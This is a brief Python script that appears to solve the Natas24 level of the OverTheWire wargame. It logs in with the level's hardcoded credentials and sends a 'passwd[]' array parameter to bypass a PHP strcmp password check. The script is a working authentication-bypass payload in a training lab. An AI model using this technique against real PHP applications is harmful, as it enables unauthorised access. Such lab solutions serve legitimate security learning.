#!/bin/python

import requests, json

url = "http://natas24.natas.labs.overthewire.org"

user = "natas24"
pwd = "OsRmXFguozKpTZZ5X14zNO43379LZveg"

r = requests.post(url + "?passwd[]=something", auth=(user,pwd))
print r.content